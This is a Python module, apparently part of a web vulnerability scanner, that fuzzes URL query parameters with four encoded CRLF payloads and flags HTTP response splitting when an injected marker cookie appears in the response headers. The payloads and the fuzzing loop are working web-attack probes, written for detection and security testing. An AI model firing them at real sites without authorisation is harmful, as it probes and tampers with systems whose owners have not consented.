import asyncio
from modules.core import console

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=injection",
    "%0aSet-Cookie:crlf=injection",
    "%0dSet-Cookie:crlf=injection",
    "%23%0d%0aSet-Cookie:crlf=injection"
]

async def check_crlf(session, url, param, payload):
    target = url.replace(f"{param}=", f"{param}={payload}")
    try:
        async with session.get(target, timeout=5, ssl=False) as resp:
            # Check headers for injected cookie
            for k, v in resp.headers.items():
                if k == "Set-Cookie" and "crlf=injection" in v:
                    return {
                        "url": target,
                        "param": param,
                        "type": "HTTP Response Splitting (Header)",
                        "payload": payload
                    }
                    
            # Less critical: Check body (reflected but maybe just XSS context)
            text = await resp.text()
            if "Set-Cookie:crlf=injection" in text:
                 pass # We ignore body reflection for now to focus on header splitting
                 
    except Exception:
        pass
    return None

async def scan_crlf(session, fuzzable_urls):
    """
    Scan for CRLF Injection / Response Splitting.
    """
    console.print(f"\n[bold cyan]--- CRLF Injection Scanner ---[/bold cyan]")
    
    if not fuzzable_urls:
         console.print("[yellow][!] No parameters found to fuzz.[/yellow]")
         return []
         
    console.print(f"[dim]Fuzzing {len(fuzzable_urls)} URLs for Header Injection...[/dim]")
    
    tasks = []
    
    for url in fuzzable_urls:
        if "=" in url:
            base, qs = url.split("?", 1)
            params = qs.split("&")
            for p in params:
                if "=" in p:
                    key = p.split("=")[0]
                    for payload in CRLF_PAYLOADS:
                        tasks.append(check_crlf(session, url, key, payload))
                        
    results = await asyncio.gather(*tasks)
    
    vulnerable = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] CRLF INJECTION FOUND![/bold red]")
             console.print(f"      URL: {res['url']}")
             console.print(f"      Payload: {res['payload']}")
             vulnerable.append(res)
             
    if not vulnerable:
        console.print("[green][+] No CRLF vulnerabilities detected.[/green]")
        
    return vulnerable
